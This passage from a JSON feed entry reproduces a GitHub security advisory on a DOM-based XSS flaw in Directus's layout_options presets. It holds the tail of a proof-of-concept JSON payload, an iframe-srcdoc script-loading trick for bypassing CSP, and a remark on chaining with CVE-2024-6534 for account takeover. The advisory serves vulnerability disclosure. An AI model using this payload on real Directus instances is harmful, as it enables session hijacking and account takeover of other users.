&lt;/script&gt;\\\\\\\"&gt;\\\",\\\"subtitle\\\":\\\"{{ email }}\\\",\\\"size\\\":4}},\\\"refresh_interval\\\":null,\\\"icon\\\":\\\"bookmark\\\",\\\"color\\\":null,\\\"collection\\\":\\\"directus_users\\\"}\"\n</code></pre>\n<p>When the user visits the view that uses the directus_users preset, the JavaScript file will be executed.</p>\n<p>Notes:</p>\n<p>Need to use an iframe to execute the malicious JavaScript file to bypass the CSP policies. The payload structure is <code>&lt;iframe srcdoc=\\\"&lt;script src='URL_MALICIOUS_FILE'&gt; &lt;/script&gt;\\\"&gt;</code>.</p>\n<p>We can target any collection that uses the vulnerable template structure that renders the layout option section.</p>\n<p>In this PoC, the target is the same user who sends the payload, but if the attacking user has permission to modify or create presets for other users or even if he does not have permissions but can chain with CVE-2024-6534, he can achieve an account takeover.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw\">https://github.com/directus/directus/security/advisories/GHSA-9qrm-48qf-r2rw</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9qrm-48qf-r2rw\">https://github.com/advisories/GHSA-9qrm-48qf-r2rw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9qrm-48qf-r2rw",
            "title": "[directus] Directus has a DOM-Based cross-site scripting (XSS) via layout_options",
            "date_modified": "2025-01-23T22:36:50.000Z",
            "date_published": "2025-01-23T22:36:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9qrm-48qf-r2rw"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}